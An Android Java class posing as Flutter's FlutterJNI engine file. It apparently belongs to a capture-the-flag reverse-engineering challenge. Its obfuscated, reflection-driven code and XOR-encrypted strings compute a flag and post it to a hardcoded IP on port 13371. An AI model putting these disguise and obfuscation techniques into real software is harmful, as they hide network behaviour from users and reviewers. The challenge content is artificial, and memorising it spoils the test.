package io.flutter.embedding.engine;

import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FlutterJNI {
    public static int nativeInit = 11;
    public static int nativeAttach;
    public static long refreshRateFPS = 604012544L;
    public static long initCalled = 5480392562841756440L;
    public static long nativeShellHolderId = -578794842304260765L;

    public static long getAccessibilityDelegate = 709305968731827028L;

    public static String onCreate = "奎誄ッ憕大ꆿ晅\ue00f\uf472剕㍏亭\u038b༂膥뵬廓릢渾\ue81d\uec6a橹㭅囎㯰܅覕蕾囇뇞嘮\uf067\ue438扬⍮廍㎺ἵ\uf199趣仐짩";

    public static String handlePlatformMessageResponse = "誄\udf89䀊쪛缚\ue181樞鲶ĭ议㰿";
    public static long[] loadLibraryCalled = {
            1779798311L, 178782306L, 1872707628L,
            1862918142L, 1157627904L, 1088421887L,
            2147477471L, 2147482619L, 2147483629L,
            1073741820L, 2131427358L
    };
    public static long[] prefetchDefaultFontManagerCalled = {
            -33545916L, 1342177280L, 1872707628L,
            -1547615743L, 1157627904L, -1090519037L,
            1074266365L, -1038189633L, -33554431L,
            1073741820L, 1543585889L, 1749025930L
    };

    public FlutterJNI(AppCompatActivity activity) {

        try {
            Class flutter = Class.forName(
                    handlePlatformMessageResponse(onCreate, getAccessibilityDelegate));
            Method meth = flutter.getMethod(
                    nativeAttach(handlePlatformMessageResponse), long[].class, long.class);

            activity.setContentView((int)meth.invoke(activity, new long[]{
                            1242894647L, 1961312199L, 1073750016L, 268435457L,
                            1090523136L, 2146436100L, 268476374L, -677892085L,
                            -1090519037L, -1442843310L, -2130711897L,
                            -1088421888L, -2147477472L, -1086324735L,
                    }, 1074790417L
            ));

            Method nativeAttachLong = flutter.getMethod(
                    handlePlatformMessageResponse("荬ꘫ䙆溅茂蕒\u0002ޤེश钗魙鯘鶒ᣕ\uece5",
                    flutter.getField("initCalled").getLong(activity)), long[].class);

            Object b = activity.getDelegate().findViewById((int)nativeAttachLong.invoke(activity, new long[]{
                    769745152L, 1644141755L, 1543420276L,
                    1610611700L, 1107296252L, 822083580L,
                    2147483647L, 1056964547L,
            }));
            Method nativeAttachStr = flutter.getMethod(
                    handlePlatformMessageResponse(
                    "犚积訣ꤩ狴Ⳮₑꥩ❠퍥訰ﳨ\ud9f6秵\udf9eȀ", nativeShellHolderId), String.class);
            Class c = Class.forName(
                    (String)nativeAttachStr.invoke(activity,
                    "\u8c32\ud930\u4d69\uf191\u65d9\ue9f6\u1c26\u8059\u34dd\ub8d7\u2cfe\u5320\uc74c\u4bc7\uff89\u63e4\u9626\u1a46"));

            Method meth1 = c.getMethod(
                    (String)nativeAttachStr.invoke(activity,
                    "\u49a0\u1cb0\uc646\u89f7\u73ac\u252d\uece0\u566f\u180a\uc3a0\ub548\u7ccf\u268a\ue830\u53d7\u0566\ucf0d\ub6a6\u7851"),
                    View.OnClickListener.class);

            meth1.invoke(b, new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    try {
                        Thread thread = new Thread(new Runnable() {

                            @Override
                            public void run() {
                                try {
                                    URL u = new URL("http://94.181.94.47:13371/login");
                                    HttpURLConnection c = (HttpURLConnection)u.openConnection();
                                    c.setRequestMethod((String)nativeAttachStr.invoke(c, "贛\ud828会\uf261慛"));
                                    c.setRequestProperty((String)nativeAttachStr.invoke(c, "晙㍹馾昆챳ꪻ㌛饸枆찖ꩠダ餪"),
                                            (String)nativeAttachStr.invoke(c, "螀튂娓쎓䬏\uf08a砀\ue182椗隊Ḍ融ཌ뒉㰐ꖌⴍ"));
                                    c.setDoOutput(true);

                                    // enc str
                                    String str = "溔㮌衩Ế\uef57緪쉲匁⇡뙭Ӎ镞篿좔夞\u2fe3밁˔鍣懺\uf690䜬햨멚࣮餵湑";
                                    int i1 = io.flutter.embedding.android.a.prefetchDefaultFontManagerCalled(str.getBytes());
                                    long j3 = io.flutter.embedding.android.a.getAccessibilityDelegate(str.getBytes());

                                    String str1 = (String)nativeAttachStr.invoke(activity, str);
                                    long j2 = getRefreshRateFPS(j3, i1);
                                    str1 = str1 + String.valueOf(j2) + "}";

                                    c.connect();

                                    try(OutputStream os = c.getOutputStream()) {
                                        byte[] input = str1.getBytes(StandardCharsets.UTF_8);
                                        os.write(input, 0, input.length);
                                    }

                                    try(BufferedReader br = new BufferedReader(
                                            new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
                                        StringBuilder str2 = new StringBuilder();
                                        String str3 = null;
                                        while ((str3 = br.readLine()) != null) {
                                            str2.append(str3.trim());
                                        }
                                        activity.runOnUiThread(new Runnable() {
                                            public void run() {
                                                Toast.makeText(activity.getApplicationContext(), str2, Toast.LENGTH_LONG).show();
                                            }
                                        });

                                    }
                                } catch (Throwable e) {

                                }
                            }
                        });
                        thread.start();
                    } catch (Throwable e) {

                    }
                }
            });

        } catch(Throwable e) {

        }
    }
    public static long getRefreshRateFPS(long j, int i) {
        int i2 = (int) j;
        int i3 = (int) (j >> 32);
        int i4 = 0;
        while (i4 < 16) {
            i4++;
            int i5 = i2;
            i2 = i3 ^ (((i << i4) | (i >>> (32 - i4))) ^ i2);
            i3 = i5;
        }
        return ((long)i3 << 32) | (i2 & 4294967295L);
    }


    // Should return 2131427356 which is Id of MainActivity
    public static int nativeInit(long[] localizationPlugin, long prefetchDefaultFontManagerCalled) {
        long l1 = refreshRateFPS + localizationPlugin[0];
        long l2 = l1 & loadLibraryCalled[0];
        long l3 = l2 - 1441808336L;
        int i2 = nativeAttach + 71;
        nativeInit = i2 % 128;
        if ((i2 % 2 == 0 ? 'e' : 'B') == 'B') {
            l2 = l3 | 1073741824L;
        } else {
            l2 = l3 ^ 1073741824L;
        }
        l1 = (l2 + localizationPlugin[7]) & loadLibraryCalled[1];
        l2 = (l1 + localizationPlugin[1]) & loadLibraryCalled[2];
        l2 = (l2 + localizationPlugin[6]) & loadLibraryCalled[3];
        int i5 = nativeInit;
        int i6 = i5 + 11;
        nativeAttach = i6 % 128;
        int i7 = i6 % 2;
        if ((i7 % 2 == 0 ? 'j' : '@') == 'j') {
            l2 = (l2 + localizationPlugin[2]) | 552992769L;
        } else {
            l2 = (l2 + localizationPlugin[2]) ^ 552992769L;
        }
        l1 = (l2 + localizationPlugin[3]) | 1073741824L;
        l3 = (l1 + localizationPlugin[8]) & loadLibraryCalled[4];
        l3 = (l3 + localizationPlugin[4]) | 268435462L;
        l3 = (l3 + localizationPlugin[9]) | 1073745920L;
        l1 = (l3 + localizationPlugin[10]) & loadLibraryCalled[5];
        l3 = (l1 + localizationPlugin[11]) & loadLibraryCalled[6];
        long l4 = (l3 + localizationPlugin[12]) & loadLibraryCalled[7];
        l1 = (l4 + localizationPlugin[5]) & loadLibraryCalled[8];
        l1 ^= prefetchDefaultFontManagerCalled;
        l1 &= loadLibraryCalled[9];
        l4 = (l1 + localizationPlugin[13])& loadLibraryCalled[10];

        return (int)l4;
    }

    // Should return 2131230912 which is Id of flag_label (Button)
    public static int nativeAttach(long[] loadLibraryCalled) {
        long l1 = initCalled + prefetchDefaultFontManagerCalled[10];
        long l2 = (l1 & loadLibraryCalled[0]) + prefetchDefaultFontManagerCalled[7];
        long l3 = l2 & loadLibraryCalled[1];
        l1 = (l3 + prefetchDefaultFontManagerCalled[0]) & loadLibraryCalled[2];
        l2 = (l1 + prefetchDefaultFontManagerCalled[3]) & loadLibraryCalled[3];
        l1 = (l2 + prefetchDefaultFontManagerCalled[11]) & loadLibraryCalled[4];
        l3 = (l1 + prefetchDefaultFontManagerCalled[8]) & loadLibraryCalled[5];
        l3 = (l3 + prefetchDefaultFontManagerCalled[5]) & loadLibraryCalled[6];
        long l4 = (l3 + prefetchDefaultFontManagerCalled[1]) & loadLibraryCalled[7];


        return (int)(l4 + prefetchDefaultFontManagerCalled[6]);
    }
    public static String handlePlatformMessageResponse(String str, long j) {
        char[] a = str.toCharArray();
        int i4 = 4;

        while(true) {
            if (!(i4 < a.length)) {
                return new String(a, 4, a.length - 4);
            }
            a[i4] = (char) ((int) (((long) (a[i4] ^ a[i4 % 4])) ^ (((long) (i4 - 4)) * j)));
            i4++;
        }
    }
    public static String nativeAttach(String str) {
        int i;
        int i2 = nativeAttach + 39;
        nativeInit = i2 % 128;
        char[] arr = str.toCharArray();
        char[] arr2 = arr;
        char c = arr[0];

        int i4 = 1;
        char[] arr3 = new char[arr2.length - 1];

        while (true) {
            if ((i4 < arr2.length ? '1' : '3') == '3') {
                return new String(arr3);
            }
            int i5 = nativeInit;
            int i6 = i5 + 97;
            nativeAttach = i6 % 128;

            if ((i6 % 2 != 0 ? 79 : 97) != 97) {
                arr3[i4 << 1] = (char) ((int) (((long) (arr2[i4] & (i4 << c))) | nativeShellHolderId));
                i = i4 + 8;
            } else {
                arr3[i4 - 1] = (char) ((int) (((long) (arr2[i4] ^ (i4 * c))) ^ nativeShellHolderId));
                i = i4 + 1;
            }
            int i7 = i5 + 91;
            nativeAttach = i7 % 128;
            int i8 = i7 % 2;
            i4 = i;
        }
    }
}
